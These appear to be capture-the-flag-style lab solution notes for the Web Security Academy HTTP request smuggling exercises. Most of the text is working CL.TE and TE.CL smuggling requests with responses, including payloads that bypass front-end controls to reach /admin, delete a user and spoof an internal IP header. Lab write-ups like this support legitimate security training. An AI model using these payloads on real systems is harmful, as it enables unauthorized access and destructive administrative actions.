# HTTP request smuggling

## How to perform an HTTP request smuggling attack

### HTTP request smuggling, basic CL.TE vulnerability
1st request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 400 Bad Request
Content-Type: application/json
Keep-Alive: timeout=0
Connection: close
Content-Length: 19

"Missing parameter"
```

2nd request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 403 Forbidden
Content-Type: application/json
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

### HTTP request smuggling, basic TE.CL vulnerability
Send twice
```
POST / HTTP/1.1
Host: acba1f431f8efb5580ada06100c10063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, obfuscating the TE header
Send twice
```
POST / HTTP/1.1
Host: ac131f3b1f7bfd5b80f42b080013003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: hello

12
GPOST / HTTP/1.1

0


```

## Finding HTTP request smuggling vulnerabilities

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: ac251f381f1a5d6a804fc8a300f20094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: acf51f6c1e75983c805a039b004500bc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## Exploiting HTTP request smuggling vulnerabilities

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Send twice
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 103

0

GET /admin HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Foo: x

---
HTTP/1.1 401 Unauthorized
...
Admin interface only available if logged in as an administrator, or if requested as localhost
```

Add `Host: localhost` and make sure that the smuggled header is not overwritten:
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 116

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Delete Carlos:
```
POST /home HTTP/1.1
Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
Transfer-Encoding: chunked
Content-Length: 139

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Send twice
```
POST /home HTTP/1.1
Host: ac6a1fa81f845ee4809d8af400a200d8.web-security-academy.net
Cookie: session=EzC4LN9GCRzow1Np5ukNkgaFzcBSZbxf
Transfer-Encoding: chunked
Content-Length: 4

86
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```

### Exploiting HTTP request smuggling to reveal front-end request rewriting
Send twice
```
POST / HTTP/1.1
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Content-Length: 124

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test

---

<h1>0 search results for 'testPOST / HTTP/1.1
X-dAEOCl-Ip: 78.102.57.9
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Con'</h1>
```

The header name is `X-dAEOCl-Ip`.

Delete Carlos:
```
POST /home HTTP/1.1
Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
Transfer-Encoding: chunked
Content-Length: 146

0

GET /admin/delete?username=carlos HTTP/1.1
X-dAEOCl-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```